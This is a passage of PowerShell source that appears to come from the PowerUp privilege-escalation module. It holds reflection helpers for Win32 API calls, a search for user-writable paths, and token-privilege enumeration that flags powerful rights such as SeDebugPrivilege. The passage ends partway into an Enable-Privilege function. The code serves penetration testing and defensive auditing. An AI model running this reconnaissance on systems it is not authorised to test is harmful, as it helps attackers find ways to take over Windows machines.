#Requires -Version 2


function New-InMemoryModule {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}

function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


function Get-ModifiablePath {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiablePath')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Alias('LiteralPaths')]
        [Switch]
        $Literal
    )

    BEGIN {
        # from http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights
        $AccessMask = @{
            [uint32]'0x80000000' = 'GenericRead'
            [uint32]'0x40000000' = 'GenericWrite'
            [uint32]'0x20000000' = 'GenericExecute'
            [uint32]'0x10000000' = 'GenericAll'
            [uint32]'0x02000000' = 'MaximumAllowed'
            [uint32]'0x01000000' = 'AccessSystemSecurity'
            [uint32]'0x00100000' = 'Synchronize'
            [uint32]'0x00080000' = 'WriteOwner'
            [uint32]'0x00040000' = 'WriteDAC'
            [uint32]'0x00020000' = 'ReadControl'
            [uint32]'0x00010000' = 'Delete'
            [uint32]'0x00000100' = 'WriteAttributes'
            [uint32]'0x00000080' = 'ReadAttributes'
            [uint32]'0x00000040' = 'DeleteChild'
            [uint32]'0x00000020' = 'Execute/Traverse'
            [uint32]'0x00000010' = 'WriteExtendedAttributes'
            [uint32]'0x00000008' = 'ReadExtendedAttributes'
            [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
            [uint32]'0x00000002' = 'WriteData/AddFile'
            [uint32]'0x00000001' = 'ReadData/ListDirectory'
        }

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value
        $TranslatedIdentityReferences = @{}
    }

    PROCESS {

        ForEach($TargetPath in $Path) {

            $CandidatePaths = @()

            # possible separator character combinations
            $SeparationCharacterSets = @('"', "'", ' ', "`"'", '" ', "' ", "`"' ")

            if ($PSBoundParameters['Literal']) {

                $TempPath = $([System.Environment]::ExpandEnvironmentVariables($TargetPath))

                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                }
                else {
                    # if the path doesn't exist, check if the parent folder allows for modification
                    $ParentPath = Split-Path -Path $TempPath -Parent  -ErrorAction SilentlyContinue
                    if ($ParentPath -and (Test-Path -Path $ParentPath)) {
                        $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                    }
                }
            }
            else {
                ForEach($SeparationCharacterSet in $SeparationCharacterSets) {
                    $TargetPath.Split($SeparationCharacterSet) | Where-Object {$_ -and ($_.trim() -ne '')} | ForEach-Object {

                        if (($SeparationCharacterSet -notmatch ' ')) {

                            $TempPath = $([System.Environment]::ExpandEnvironmentVariables($_)).Trim()

                            if ($TempPath -and ($TempPath -ne '')) {
                                if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                    # if the path exists, resolve it and add it to the candidate list
                                    $CandidatePaths += Resolve-Path -Path $TempPath | Select-Object -ExpandProperty Path
                                }

                                else {
                                    # if the path doesn't exist, check if the parent folder allows for modification
                                    try {
                                        $ParentPath = (Split-Path -Path $TempPath -Parent -ErrorAction SilentlyContinue).Trim()
                                        if ($ParentPath -and ($ParentPath -ne '') -and (Test-Path -Path $ParentPath  -ErrorAction SilentlyContinue)) {
                                            $CandidatePaths += Resolve-Path -Path $ParentPath -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                                        }
                                    }
                                    catch {}
                                }
                            }
                        }
                        else {
                            # if the separator contains a space
                            $CandidatePaths += Resolve-Path -Path $([System.Environment]::ExpandEnvironmentVariables($_)) -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path | ForEach-Object {$_.Trim()} | Where-Object {($_ -ne '') -and (Test-Path -Path $_)}
                        }
                    }
                }
            }

            $CandidatePaths | Sort-Object -Unique | ForEach-Object {
                $CandidatePath = $_
                Get-Acl -Path $CandidatePath | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {

                    $FileSystemRights = $_.FileSystemRights.value__

                    $Permissions = $AccessMask.Keys | Where-Object { $FileSystemRights -band $_ } | ForEach-Object { $AccessMask[$_] }

                    # the set of permission types that allow for modification
                    $Comparison = Compare-Object -ReferenceObject $Permissions -DifferenceObject @('GenericWrite', 'GenericAll', 'MaximumAllowed', 'WriteOwner', 'WriteDAC', 'WriteData/AddFile', 'AppendData/AddSubdirectory') -IncludeEqual -ExcludeDifferent

                    if ($Comparison) {
                        if ($_.IdentityReference -notmatch '^S-1-5.*') {
                            if (-not ($TranslatedIdentityReferences[$_.IdentityReference])) {
                                # translate the IdentityReference if it's a username and not a SID
                                $IdentityUser = New-Object System.Security.Principal.NTAccount($_.IdentityReference)
                                $TranslatedIdentityReferences[$_.IdentityReference] = $IdentityUser.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExpandProperty Value
                            }
                            $IdentitySID = $TranslatedIdentityReferences[$_.IdentityReference]
                        }
                        else {
                            $IdentitySID = $_.IdentityReference
                        }

                        if ($CurrentUserSids -contains $IdentitySID) {
                            $Out = New-Object PSObject
                            $Out | Add-Member Noteproperty 'ModifiablePath' $CandidatePath
                            $Out | Add-Member Noteproperty 'IdentityReference' $_.IdentityReference
                            $Out | Add-Member Noteproperty 'Permissions' $Permissions
                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiablePath')
                            $Out
                        }
                    }
                }
            }
        }
    }
}


function Get-TokenInformation {

    [OutputType('PowerUp.TokenGroup')]
    [OutputType('PowerUp.TokenPrivilege')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [Alias('hToken', 'Token')]
        [ValidateNotNullOrEmpty()]
        [IntPtr]
        $TokenHandle,

        [String[]]
        [ValidateSet('Groups', 'Privileges', 'Type')]
        $InformationClass = 'Privileges'
    )

    PROCESS {
        if ($InformationClass -eq 'Groups') {
            # query the process token with the TOKEN_INFORMATION_CLASS = 2 enum to retrieve a TOKEN_GROUPS structure

            # initial query to determine the necessary buffer size
            $TokenGroupsPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 2, 0, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize)
            [IntPtr]$TokenGroupsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenGroupsPtrSize)

            $Success = $Advapi32::GetTokenInformation($TokenHandle, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenGroups = $TokenGroupsPtr -as $TOKEN_GROUPS
                For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
                    # convert each token group SID to a displayable string

                    if ($TokenGroups.Groups[$i].SID) {
                        $SidString = ''
                        $Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($Result -eq 0) {
                            Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $GroupSid = New-Object PSObject
                            $GroupSid | Add-Member Noteproperty 'SID' $SidString
                            # cast the atttributes field as our SidAttributes enum
                            $GroupSid | Add-Member Noteproperty 'Attributes' ($TokenGroups.Groups[$i].Attributes -as $SidAttributes)
                            $GroupSid | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                            $GroupSid.PSObject.TypeNames.Insert(0, 'PowerUp.TokenGroup')
                            $GroupSid
                        }
                    }
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenGroupsPtr)
        }
        elseif ($InformationClass -eq 'Privileges') {
            # query the process token with the TOKEN_INFORMATION_CLASS = 3 enum to retrieve a TOKEN_PRIVILEGES structure

            # initial query to determine the necessary buffer size
            $TokenPrivilegesPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 3, 0, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize)
            [IntPtr]$TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivilegesPtrSize)

            $Success = $Advapi32::GetTokenInformation($TokenHandle, 3, $TokenPrivilegesPtr, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenPrivileges = $TokenPrivilegesPtr -as $TOKEN_PRIVILEGES
                For ($i=0; $i -lt $TokenPrivileges.PrivilegeCount; $i++) {
                    $Privilege = New-Object PSObject
                    $Privilege | Add-Member Noteproperty 'Privilege' $TokenPrivileges.Privileges[$i].Luid.LowPart.ToString()
                    # cast the lower Luid field as our LuidAttributes enum
                    $Privilege | Add-Member Noteproperty 'Attributes' ($TokenPrivileges.Privileges[$i].Attributes -as $LuidAttributes)
                    $Privilege | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                    $Privilege.PSObject.TypeNames.Insert(0, 'PowerUp.TokenPrivilege')
                    $Privilege
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
        }
        else {
            $TokenResult = New-Object PSObject

            # query the process token with the TOKEN_INFORMATION_CLASS = 8 enum to retrieve a TOKEN_TYPE enum

            # initial query to determine the necessary buffer size
            $TokenTypePtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenTypePtrSize, [ref]$TokenTypePtrSize)
            [IntPtr]$TokenTypePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenTypePtrSize)

            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, $TokenTypePtr, $TokenTypePtrSize, [ref]$TokenTypePtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $Temp = $TokenTypePtr -as $TOKEN_TYPE
                $TokenResult | Add-Member Noteproperty 'Type' $Temp.Type
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenTypePtr)

            # now query the process token with the TOKEN_INFORMATION_CLASS = 8 enum to retrieve a SECURITY_IMPERSONATION_LEVEL enum

            # initial query to determine the necessary buffer size
            $TokenImpersonationLevelPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenImpersonationLevelPtrSize, [ref]$TokenImpersonationLevelPtrSize)
            [IntPtr]$TokenImpersonationLevelPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenImpersonationLevelPtrSize)

            $Success2 = $Advapi32::GetTokenInformation($TokenHandle, 8, $TokenImpersonationLevelPtr, $TokenImpersonationLevelPtrSize, [ref]$TokenImpersonationLevelPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success2) {
                $Temp = $TokenImpersonationLevelPtr -as $IMPERSONATION_LEVEL
                $TokenResult | Add-Member Noteproperty 'ImpersonationLevel' $Temp.ImpersonationLevel
                $TokenResult | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                $TokenResult.PSObject.TypeNames.Insert(0, 'PowerUp.TokenType')
                $TokenResult
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenImpersonationLevelPtr)
        }
    }
}


function Get-ProcessTokenGroup {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id
    )

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            # open up a pseudo handle to the current process- don't need to worry about closing
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }

        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenGroups = Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Groups'
                $TokenGroups | ForEach-Object {
                    $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                    $_
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }

            if ($PSBoundParameters['Id']) {
                # close the handle if we used OpenProcess()
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}


function Get-ProcessTokenPrivilege {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenPrivilege')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id,

        [Switch]
        [Alias('Privileged')]
        $Special
    )

    BEGIN {
        $SpecialPrivileges = @('SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 'SeDebugPrivilege', 'SeSystemEnvironmentPrivilege', 'SeImpersonatePrivilege', 'SeTcbPrivilege')
    }

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            # open up a pseudo handle to the current process- don't need to worry about closing
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }

        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Privileges' | ForEach-Object {
                    if ($PSBoundParameters['Special']) {
                        if ($SpecialPrivileges -Contains $_.Privilege) {
                            $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                            $_ | Add-Member Aliasproperty Name ProcessId
                            $_
                        }
                    }
                    else {
                        $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                        $_
                    }
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }

            if ($PSBoundParameters['Id']) {
                # close the handle if we used OpenProcess()
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}


function Get-ProcessTokenType {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenType')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id
    )

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            # open up a pseudo handle to the current process- don't need to worry about closing
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }

        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenType = Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Type'
                $TokenType | ForEach-Object {
                    $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                    $_
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }

            if ($PSBoundParameters['Id']) {
                # close the handle if we used OpenProcess()
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}


function Enable-Privilege {

    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Privileges')]
